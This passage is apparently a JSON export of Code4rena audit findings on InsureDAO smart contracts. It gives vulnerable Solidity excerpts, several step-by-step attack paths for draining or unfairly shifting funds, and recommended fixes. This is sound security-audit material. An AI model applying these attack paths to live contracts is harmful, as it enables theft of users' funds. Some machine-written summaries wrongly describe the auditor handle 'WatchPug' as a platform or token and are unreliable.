      "content": "## Handle\n\ngzeon\n\n\n## Vulnerability details\n\n## Impact\nTo prevent withdrawal front-running, a lockup period is set between withdrawal request and withdrawal. However, there are no obligation to withdraw after the lockup period and the capital will keep earning premium during lockup. A strategy for underwriter is to keep requesting withdrawal every `lockup period` to keep their average lockup to `lockup period/2`. \n\n## Proof of Concept\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L279\n\nAssuming\n1) Reporting DAO vote last for 24 hours (according to docs) plus there will be delay between the hack and vote creation \n2) the `lockup period` is set to 86400 (24 hours) in the supplied test cases\nIt is very likely an underwriter can avoid payout by such strategy since their effective lockup would be 12 hours only. They will continue to earn yield in the pool and only require some extra gas cost for the `requestWithdraw` every 24 hours.\n\n## Recommended Mitigation Steps\nExtend the lockup period at least by a factor of 2 or force underwriter to withdraw after lockup period.",
      "summary": "\nThis bug report is about an issue with the lockup period set to prevent withdrawal front-running. This issue occurs when an underwriter requests a withdrawal every lockup period, which results in their average lockup period being reduced to half the lockup period. This means that the underwriter can avoid payout and continue to earn yield in the pool, only requiring additional gas costs for the withdrawal request every 24 hours. To mitigate this issue, it is recommended to extend the lockup period by at least a factor of two, or to force underwriters to withdraw after the lockup period.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/295",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "1312",
      "title": "[M-06] Index compensate is 0 when totalLiquidity() is enough to cover the whole amount",
      "impact": "MEDIUM",
      "content": "_Submitted by pauliax_\n\nIn IndexTemplate, function compensate, When `\\_amount > \\_value`, and `<= totalLiquidity()`, the value of `\\_compensated` is not set, so it gets a default value of 0:\n\n```solidity\nif (_value >= _amount) {\n    ...\n    _compensated = _amount;\n} else {\n    ...\n    if (totalLiquidity() < _amount) {\n        ...\n        _compensated = _value + _cds;\n    }\n    vault.offsetDebt(_compensated, msg.sender);\n}\n```\n\nBut nevertheless, in both cases, it calls `vault.offsetDebt`, even when the`\\_compensated` is 0 (no else block).\n\n#### Recommended Mitigation Steps\n\nI think, in this case, it should try to redeem the premium (withdrawCredit?) to cover the whole amount, but I am not sure about the intentions as I didn't have enough time to understand this protocol in depth.\n\n\n**[oishun1112 (Insure) confirmed and resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/354):**\n > Right.\n> totalLiquidity = underlyingValue + pendingPremium.\n> \n> I will discuss how to fix this issue with my team\n\n",
      "summary": "\nThis bug report is about the IndexTemplate function compensate. When _amount is greater than _value and less than or equal to totalLiquidity(), the value of _compensated is not set, resulting in a default value of 0. Despite this, in both cases, vault.offsetDebt is called, even when the _compensated is 0. The recommended mitigation step is to try to redeem the premium (withdrawCredit?) to cover the whole amount, although the intentions of this protocol are not clear due to lack of time to understand it in depth.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/354",
      "tags": [],
      "finders": [
        "pauliax"
      ]
    },
    {
      "id": "1311",
      "title": "[M-05] Vault.sol Tokens with fee on transfer are not supported",
      "impact": "MEDIUM",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nThere are ERC20 tokens that charge fee for every `transfer()` / `transferFrom()`.\n\n`Vault.sol#addValue()` assumes that the received amount is the same as the transfer amount, and uses it to calculate attributions, balance amounts, etc. While the actual transferred amount can be lower for those tokens.\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L124-L140\n\n```solidity\nfunction addValue(\n    uint256 _amount,\n    address _from,\n    address _beneficiary\n) external override onlyMarket returns (uint256 _attributions) {\n\n    if (totalAttributions == 0) {\n        _attributions = _amount;\n    } else {\n        uint256 _pool = valueAll();\n        _attributions = (_amount * totalAttributions) / _pool;\n    }\n    IERC20(token).safeTransferFrom(_from, address(this), _amount);\n    balance += _amount;\n    totalAttributions += _attributions;\n    attributions[_beneficiary] += _attributions;\n}\n```\n\n### Recommendation\n\nConsider comparing before and after balance to get the actual transferred amount.",
      "summary": "\nThis bug report is about an issue with the WatchPug ERC20 tokens, which charge a fee for every `transfer()` or `transferFrom()` function. The problem is that the `Vault.sol#addValue()` assumes that the received amount is the same as the transfer amount, but the actual transferred amount can be lower due to the fees.\n\nThe recommendation is to compare the before and after balance to get the actual transferred amount. This will help ensure that the correct amount is taken into account when calculating attributions, balance amounts, etc.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/236",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "pmerkleplant",
        "cmichel",
        "Dravee",
        "Ruhum",
        "WatchPug"
      ]
    },
    {
      "id": "1310",
      "title": "[M-04] System Debt Is Not Handled When Insurance Pools Become Insolvent",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\nIf an incident has occurred where an insurance policy is to be redeemed. The market is put into the `MarketStatus.Payingout` mode where the `_insurance.insured` account is allowed to redeem their cover and receive a payout amount. Upon paying out the insurance cover, any user is able to resume the market by calling `PoolTemplate.resume()`. This function will compensate the insurance pool if it is insolvent by querying `IndexTemplate.compensate()` which in turn queries `CDSTemplate.compensate()` to cover any shortage.\n\nIn the event none of these entities are able to cover the shortage in debt, the system accrues the debt. However, there is currently no mechanism to ensure when `transferDebt()` is called in `PoolTemplate.resume()`, the accrued system debt is paid off. Therefore, the system may incorrectly handle insolvency on an extreme edge case, generating system instability.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L691-L734>\n```solidity\nfunction resume() external {\n    require(\n        marketStatus == MarketStatus.Payingout &&\n            pendingEnd < block.timestamp,\n        \"ERROR: UNABLE_TO_RESUME\"\n    );\n\n    uint256 _debt = vault.debts(address(this));\n    uint256 _totalCredit = totalCredit;\n    uint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /\n        totalLiquidity();\n    uint256 _actualDeduction;\n    for (uint256 i = 0; i < indexList.length; i++) {\n        address _index = indexList[i];\n        uint256 _credit = indicies[_index].credit;\n        if (_credit > 0) {\n            uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n                _totalCredit;\n            uint256 _redeemAmount = _divCeil(\n                _deductionFromIndex,\n                _shareOfIndex\n            );\n            _actualDeduction += IIndexTemplate(_index).compensate(\n                _redeemAmount\n            );\n        }\n    }\n\n    uint256 _deductionFromPool = _debt -\n        _deductionFromIndex /\n        MAGIC_SCALE_1E6;\n    uint256 _shortage = _deductionFromIndex /\n        MAGIC_SCALE_1E6 -\n        _actualDeduction;\n\n    if (_deductionFromPool > 0) {\n        vault.offsetDebt(_deductionFromPool, address(this));\n    }\n\n    vault.transferDebt(_shortage);\n\n    marketStatus = MarketStatus.Trading;\n    emit MarketStatusChanged(MarketStatus.Trading);\n}\n```\n- <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L421-L450>\n- <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L248-L277>\n\n\n#### Recommended Mitigation Steps\n\nConsider devising a mechanism to ensure system debt is properly handled. After discussions with the sponsor, it seems that they will be implementing a way to mint `INSURE` tokens which will be used to cover the shortfall.\n\n**[oishun1112 (Insure) acknowledged](https://github.com/code-423n4/2022-01-insure-findings/issues/228)**\n > yes, PoolTemplate calls transferDebt() to make his debt to the system debt in case all Index and CDS layers couldn't cover the shortage.\n> In this case, we have to repay the system debt somehow since this is the situation that we over-lose money. One way is that someone calls repayDebt() and pay for it (not realistic at all). As we implement the way to payback, we are considering minting INSURE token or, other better mechanism.\n> \n > This is not developed yet, and acknowledged.\n\n\n",
      "summary": "\nThis bug report describes a vulnerability in an insurance policy redemption system. If an incident occurs where an insurance policy is to be redeemed, the market is put into the 'MarketStatus.Payingout' mode, allowing the '_insurance.insured' account to redeem their cover and receive a payout amount. However, there is currently no mechanism to ensure when 'transferDebt()' is called in 'PoolTemplate.resume()', the accrued system debt is paid off. This could lead to system instability in extreme edge cases.\n\nProof of concept code for the vulnerability is provided in the report. The recommended mitigation step is to devise a mechanism to ensure the system debt is properly handled. After discussions with the sponsor, it seems that they will be implementing a way to mint 'INSURE' tokens which will be used to cover the shortfall.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/228",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1309",
      "title": "[M-03] Signature replay",
      "impact": "MEDIUM",
      "content": "_Submitted by 0x1f8b_\n\nSignature replay in `PoolTemplate`.\n\n#### Proof of Concept\n\nThe `redeem` method of `PoolTemplate` verifies the data stored in `incident`, and the verification logic of this process is performed as following:\n```solidity\nrequire(\n    MerkleProof.verify(\n        _merkleProof,\n        _targets,\n        keccak256(\n            abi.encodePacked(_insurance.target, _insurance.insured)\n        )\n    ) ||\n        MerkleProof.verify(\n            _merkleProof,\n            _targets,\n            keccak256(abi.encodePacked(_insurance.target, address(0)))\n        ),\n    \"ERROR: INSURANCE_EXEMPTED\"\n);\n```\n\nAs can be seen, the only data related to the `_insurance` are`  target ` and `insured`, so as the incident has no relation with the`  Insurance `, apparently nothing prevents a user to call `insure` with high amounts, after receive the incident, the only thing that prevents this from being reused is that the owner creates the incident with an `_incidentTimestamp` from the past.\n\nSo if an owner create a incident from the future it's possible to create a new `insure` that could be reused by the same affected address.\n\nAnother lack of input verification that could facilitate this attack is the `_span=0` in the `insure` method.\n\n\n#### Recommended Mitigation Steps\n\nIt is mandatory to add a check in `applyCover` that`  _incidentTimestamp ` is less than the current date and the `span` argument is greater than 0 in the`  insure ` method.\n\n**[oishun1112 (Insure) confirmed and resolved, but disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/184):**\n > agree on the _incidentTimestamp check.\n> disagree on span check since there already is\n> ```\n> require(\n>             parameters.getMinDate(msg.sender) <= _span,\n>             \"ERROR: INSURE_SPAN_BELOW_MIN\"\n>         );\n> ```\n> we are going to set default value of 1week for everyone\n\n**[oishun1112 (Insure) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/184#issuecomment-1015081369):**\n > we assume ownership control works fine.\n> this can lose money in-proper way, but not at risk since onlyOwner modifier applied.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/184#issuecomment-1023674000):**\n > going to leave this as 2 \n> \n> `\n> 2  Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> The external requirement here would be an incorrect timestamp from the owner which would cause assets to be at risk from the replay. \n\n**[oishun1112 (Insure) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/184#issuecomment-1027599600):**\n > there is\n> ```\n> _span >= getMinDate() \n> ```\n> so we don't implement _span > 0\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `PoolTemplate` of the system. The vulnerability allows for signature replay which can be exploited by a malicious user. The vulnerability is caused by the lack of verification of the data stored in `incident` and the lack of input verification of `_incidentTimestamp` and `span` argument in the `insure` method. The proof of concept was done manually. \n\nTo mitigate the vulnerability, it is recommended to add a check in `applyCover` that `_incidentTimestamp` is less than the current date and the `span` argument is greater than 0 in the `insure` method. This will ensure that the incident is not created with a timestamp from the past, and that the `span` argument is not set to 0.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/184",
      "tags": [
        "Replay Attack"
      ],
      "finders": [
        "0x1f8b"
      ]
    },
    {
      "id": "1308",
      "title": "[M-02] Owner can call applyCover multiple times in PoolTemplate.sol",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncamden\n\n\n## Vulnerability details\n\n## Impact\nThe owner could potentially extend the insurance period indefinitely in the `applyCover` function without ever allowing the market to resume. This is because there is no check in `applyCover` to ensure that the market is in a `Trading` state.\n\nThis can also allow the owner to emit fraudulent `MarketStatusChanged` events.\n\n## Recommended Mitigation Steps\nRequire that the market be in a `Trading` state to allow another `applyCover` call.",
      "summary": "\nThis bug report is about a vulnerability in the `applyCover` function of a certain system. The vulnerability allows the owner of the system to extend the insurance period indefinitely without ever allowing the market to resume. This can also allow the owner to emit fraudulent `MarketStatusChanged` events. To mitigate this vulnerability, it is recommended to require that the market be in a `Trading` state to allow another `applyCover` call.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/160",
      "tags": [],
      "finders": [
        "camden"
      ]
    },
    {
      "id": "1307",
      "title": "[M-01] repayDebt in Vault.sol could DOS functionality for markets",
      "impact": "MEDIUM",
      "content": "_Submitted by p4st13r4_\n\nAny user can pay the debt for any borrower in `Vault.sol`, by using `repayDebt()`. This function allows anyone to repay any amount of borrowed value, up-to and including the `totalDebt` value; it works by setting the `debts[_target]` to zero, and decreasing `totalDebt` by the given amount, up to zero. However, all debts of the other borrowers are left untouched.\n\nIf a malicious (but generous) user were to repay the debt for all the borrowers, markets functionality regarding borrowing would be DOSed: the vault would try to decrease the debt of the market, successfully, but would fail to decrease `totalDebt` as it would result in an underflow\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L257>\n\n\n#### Recommended Mitigation Steps\n\nMake `repayDebt()` accept an amount up-to and including the value of the debt for the given borrower\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/126):**\n > this needs to be specified how in more detail.\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Vault.sol` smart contract. The `repayDebt()` function allows any user to pay the debt for any borrower, up-to and including the `totalDebt` value. If a malicious user were to repay the debt for all the borrowers, markets functionality regarding borrowing would be DOSed. The proof of concept to demonstrate this vulnerability can be found in the given link and the recommended mitigation step is to make `repayDebt()` accept an amount up-to and including the value of the debt for the given borrower.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/126",
      "tags": [],
      "finders": [
        "p4st13r4"
      ]
    },
    {
      "id": "1306",
      "title": "[H-13] Admin of the index pool can withdrawCredit() after applyCover() to avoid taking loss for the compensation paid for a certain pool",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nIn the current implementation, when an incident is reported for a certain pool, the index pool can still `withdrawCredit()` from the pool, which in the best interest of an index pool, the admin of the index pool is preferred to do so.\n\nThis allows the index pool to escape from the responsibility for the risks of invested pools.\n\nMaking the LPs of the pool take an unfair share of the responsibility.\n\n### PoC\n\n- Pool A `totalCredit` = 10,000\n- Pool A `rewardPerCredit` = 1\n\n1. [Index Pool 1] allocates 1,000 credits to Pool `A`:\n\n- `totalCredit` = 11,000\n- indicies[Index Pool 1] = 1,000\n\n2. After a while, Pool A `rewardPerCredit` has grown to `1.1`, and `applyCover()` has been called, [Index Pool 1] call `withdrawCredit()` get 100 premium\n\n- `totalCredit` = 10,000\n- indicies[Index Pool 1] = 0\n\n3. After `pendingEnd`, the pool `resume()`,[ Index Pool 1] will not be paying for the compensation since `credit` is 0.\n\nIn our case, [Index Pool 1] earned premium without paying for a part of the compensation.\n\n### Recommendation\n\nChange to:\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L416-L421\n\n```solidity\n    function withdrawCredit(uint256 _credit)\n        external\n        override\n        returns (uint256 _pending)\n    {\n        require(\n            marketStatus == MarketStatus.Trading,\n            \"ERROR: WITHDRAW_CREDIT_BAD_CONDITIONS\"\n        );\n        IndexInfo storage _index = indicies[msg.sender];\n```",
      "summary": "\nThis bug report is about WatchPug, a pool that allows users to invest in various pools. The vulnerability in the current implementation is that when an incident is reported for a certain pool, the index pool can still withdraw credit from the pool, which is not in the best interest of the pool. This allows the index pool to escape from the responsibility for the risks of invested pools, making the LPs of the pool take an unfair share of the responsibility. \n\nA proof of concept (PoC) was provided to demonstrate the vulnerability. It showed that if the reward per credit of a pool increases, an index pool can call withdrawCredit and get a premium without paying for a part of the compensation.\n\nThe recommendation provided is to change the code in PoolTemplate.sol on lines 416-421. This code change should prevent the index pool from withdrawing credit from the pool without paying for a part of the compensation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/281",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1305",
      "title": "[H-12] IndexTemplate.sol Wrong implementation allows lp of the index pool to resume a locked PayingOut pool and escape the responsibility for the compensation",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nBased on the context, the system intends to lock all the lps during PayingOut period.\n\nHowever, the current implementation allows anyone, including LPs to call `resume()` and unlock the index pool.\n\nIt allows a malicious LP to escape the responsibility for the compensation, at the expense of other LPs paying more than expected.\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L459-L471\n\n```solidity\nfunction resume() external override {\n    uint256 _poolLength = poolList.length;\n\n    for (uint256 i = 0; i < _poolLength; i++) {\n        require(\n            IPoolTemplate(poolList[i]).paused() == false,\n            \"ERROR: POOL_IS_PAUSED\"\n        );\n    }\n\n    locked = false;\n    emit Resumed();\n}\n```\n\n## Recommendation\n\nChange to:\n\n ```solidity\nfunction resume() external override {\n    uint256 _poolLength = poolList.length;\n\n    for (uint256 i = 0; i < _poolLength; i++) {\n        require(\n            IPoolTemplate(poolList[i]).marketStatus() == MarketStatus.Trading,\n            \"ERROR: POOL_IS_PAYINGOUT\"\n        );\n    }\n\n    locked = false;\n    emit Resumed();\n}\n```",
      "summary": "\nThis bug report is about a vulnerability in the WatchPug system. The system is intended to lock all the lps (liquidity providers) during PayingOut period. However, the current implementation allows anyone, including LPs to call `resume()` and unlock the index pool. This allows a malicious LP to escape the responsibility for the compensation, at the expense of other LPs paying more than expected. The recommendation is to change the code of the `resume()` function, so that it requires the pool to be in the Trading status instead of the Paused status. This will ensure that the pool is not unlocked during the PayingOut period, and malicious LPs cannot escape their responsibilities.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/278",
      "tags": [],
      "finders": [
        "WatchPug",
        "leastwood"
      ]
    },
    {
      "id": "1304",
      "title": "[H-11] PoolTemplate.sol#resume() Wrong implementation of resume() will compensate overmuch redeem amount from index pools",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\n## Root Cause\n\nWrong arithmetic.\n\n---\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L700-L717\n\n```solidity\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /\n            totalLiquidity();\n    uint256 _actualDeduction;\n    for (uint256 i = 0; i < indexList.length; i++) {\n        address _index = indexList[i];\n        uint256 _credit = indicies[_index].credit;\n        if (_credit > 0) {\n            uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n                _totalCredit;\n            uint256 _redeemAmount = _divCeil(\n                _deductionFromIndex,\n                _shareOfIndex\n            );\n            _actualDeduction += IIndexTemplate(_index).compensate(\n                _redeemAmount\n            );\n        }\n    }\n```\n\n\n### PoC\n\n- totalLiquidity = 200,000* 10**18;\n- totalCredit = 100,000 * 10**18;\n- debt = 10,000 * 10**18;\n\n- [Index Pool 1] Credit = 20,000 * 10**18;\n- [Index Pool 2] Credit = 30,000 * 10**18;\n\n```\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /\n            totalLiquidity();\n// _deductionFromIndex = 10,000 * 10**6 * 10**18;\n\n```\n\n[Index Pool 1]:\n\n```\nuint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;  \n//  _shareOfIndex = 200000\n\nuint256 _redeemAmount = _divCeil(\n    _deductionFromIndex,\n    _shareOfIndex\n);\n\n// _redeemAmount = 25,000 * 10**18;\n```\n\n[Index Pool 2]:\n\n```\nuint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;  \n//  _shareOfIndex = 300000\n\nuint256 _redeemAmount = _divCeil(\n    _deductionFromIndex,\n    _shareOfIndex\n);\n\n// _redeemAmount = 16666666666666666666667 (~ 16,666 * 10**18)\n```\n\nIn most cases, the transaction will revet on underflow at:\n```\nuint256 _shortage = _deductionFromIndex /\n            MAGIC_SCALE_1E6 -\n            _actualDeduction;\n```\n\nIn some cases, specific pools will be liable for unfair compensation:\n\nIf the CSD is empty, `Index Pool 1` only have `6,000 * 10**18` and `Index Pool 2` only have `4,000 * 10**18`, the `_actualDeduction` will be `10,000 * 10**18`, `_deductionFromPool` will be `0`.\n\n\n`Index Pool 1` should only pay `1,000 * 10**18`, but actually paid `6,000 * 10**18`, the LPs of `Index Pool 1` now suffer funds loss.\n\n### Recommendation\n\nChange to:\n\n```solidity\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) / totalLiquidity();\nuint256 _actualDeduction;\nfor (uint256 i = 0; i < indexList.length; i++) {\n    address _index = indexList[i];\n    uint256 _credit = indicies[_index].credit;\n    if (_credit > 0) {\n        uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n            _totalCredit;\n        uint256 _redeemAmount = _divCeil(\n            _deductionFromIndex * _shareOfIndex,\n            MAGIC_SCALE_1E6 * MAGIC_SCALE_1E6\n        );\n        _actualDeduction += IIndexTemplate(_index).compensate(\n            _redeemAmount\n        );\n    }\n}\n```",
      "summary": "\nA bug report has been filed for the WatchPug platform. The root cause of the bug is wrong arithmetic. The PoC (Proof of Concept) given in the report states that if the totalLiquidity is 200,000* 10**18, totalCredit is 100,000 * 10**18 and debt is 10,000 * 10**18, and [Index Pool 1] Credit is 20,000 * 10**18 and [Index Pool 2] Credit is 30,000 * 10**18, then _deductionFromIndex is 10,000 * 10**6 * 10**18, _shareOfIndex for [Index Pool 1] is 200000 and _redeemAmount for [Index Pool 1] is 25,000 * 10**18, and _shareOfIndex for [Index Pool 2] is 300000 and _redeemAmount for [Index Pool 2] is 16666666666666666666667 (~ 16,666 * 10**18). In most cases, the transaction will revet on underflow, and in some cases, specific pools will be liable for unfair compensation.\n\nThe recommendation given in the report is to change the code to the following: \n\n```solidity\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) / totalLiquidity();\nuint256 _actualDeduction;\nfor (uint256 i = 0; i < indexList.length; i++) {\n    address _index = indexList[i];\n    uint256 _credit = indicies[_index].credit;\n    if (_credit > 0) {\n        uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n            _totalCredit;\n        uint256 _redeemAmount = _divCeil(\n            _deductionFromIndex * _shareOfIndex,\n            MAGIC_SCALE_1E6 * MAGIC_SCALE_1E6\n        );\n        _actualDeduction += IIndexTemplate(_index).compensate(\n            _redeemAmount\n        );\n    }\n}\n```\n\nIn summary, a bug report has been filed for the WatchPug platform due to wrong arithmetic. The PoC states that specific pools will be liable for unfair compensation in some cases. The recommendation given",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/283",
      "tags": [],
      "finders": [
        "WatchPug",
        "danb"
      ]
    },
    {
      "id": "1303",
      "title": "[H-10] A malicious/compromised Registry or Factory admin can drain all the funds from the Vault contracts",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L52-L58>\n\n```solidity\nmodifier onlyMarket() {\n    require(\n        IRegistry(registry).isListed(msg.sender),\n        \"ERROR_ONLY_MARKET\"\n    );\n    _;\n}\n```\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L201-L206>\n\n```solidity\nfunction borrowValue(uint256 _amount, address _to) external onlyMarket override {\n    debts[msg.sender] += _amount;\n    totalDebt += _amount;\n\n    IERC20(token).safeTransfer(_to, _amount);\n}\n```\n\nThe current design/implementation allows a market address (registered on the `registry`) to call `Vault#borrowValue()` and transfer tokens to an arbitrary address.\n\n#### Proof of Concept\n\nSee the PoC section on \\[WP-H24].\n\n#### Recommendation\n\n1.  Consider adding constrains (eg. timelock) to `Registry#supportMarket()`.\n2.  Consdier adding constrains (upper bound for each pool, and index pool for example) to `Vault#borrowValue()`.\n\n**[oishun1112 (Insure) acknowledged and disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/272):**\n > Ownership has to be stolen to drain funds using this method and we assume ownership control driven safely, so we don't treat this as issue\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/272#issuecomment-1023327233):**\n > Agree with warden that the privilege addresses should not be able to use approvals in a way that rugs users funds.\n> \n> Based on the fact that we have seen many rug pulls in the space based on compromised \"owner\" keys, this is a valid attack path.\n> `\n> 3  High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Vault contract. The vulnerability allows a market address, registered on the registry, to call Vault#borrowValue() and transfer tokens to an arbitrary address. This could be exploited to cause loss of funds. The PoC section of the report provides more details on how the vulnerability can be exploited. The report recommends two solutions to prevent this vulnerability from being exploited. The first is to add constraints to the Registry#supportMarket() function. The second is to add constraints, such as an upper bound for each pool and an index pool, to the Vault#borrowValue() function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/272",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1302",
      "title": "[H-09] Vault#setController() owner of the Vault contracts can drain funds from the Vault",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L485-L496\n\n```solidity\nfunction setController(address _controller) public override onlyOwner {\n    require(_controller != address(0), \"ERROR_ZERO_ADDRESS\");\n\n    if (address(controller) != address(0)) {\n        controller.migrate(address(_controller));\n        controller = IController(_controller);\n    } else {\n        controller = IController(_controller);\n    }\n\n    emit ControllerSet(_controller);\n}\n```\n\nThe owner of the Vault contract can set an arbitrary address as the `controller`.\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L342-L352\n\n```solidity\nfunction utilize() external override returns (uint256 _amount) {\n    if (keeper != address(0)) {\n        require(msg.sender == keeper, \"ERROR_NOT_KEEPER\");\n    }\n    _amount = available(); //balance\n    if (_amount > 0) {\n        IERC20(token).safeTransfer(address(controller), _amount);\n        balance -= _amount;\n        controller.earn(address(token), _amount);\n    }\n}\n```\n\nA malicious `controller` contract can transfer funds from the Vault to the attacker.\n\n## PoC\n\nA malicious/compromised can:\n\n1. Call `Vault#setController()` and set `controller` to a malicious contract;\n    -   L489 the old controller will transfer funds to the new, malicious controller.\n2. Call `Vault#utilize()` to deposit all the balance in the Vault contract into the malicious controller contract.\n3. Withdraw all the funds from the malicious controller contract.\n\n## Recommendation\n\nConsider disallowing `Vault#setController()` to set a new address if a controller is existing, which terminates the possibility of migrating funds to a specified address provided by the owner. Or, putting a timelock to this function at least.",
      "summary": "\nThis bug report is about a vulnerability in the Vault contract of the 2022-01-insure repository. The owner of the Vault contract can set an arbitrary address as the `controller`. This malicious `controller` contract can then transfer funds from the Vault to the attacker. A malicious/compromised user can call the `Vault#setController()` and set `controller` to a malicious contract, and then call `Vault#utilize()` to deposit all the balance in the Vault contract into the malicious controller contract. The attacker can then withdraw all the funds from the malicious controller contract. To fix this vulnerability, it is recommended to consider disallowing the `Vault#setController()` to set a new address if a controller is existing, or to put a timelock to this function at least.",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
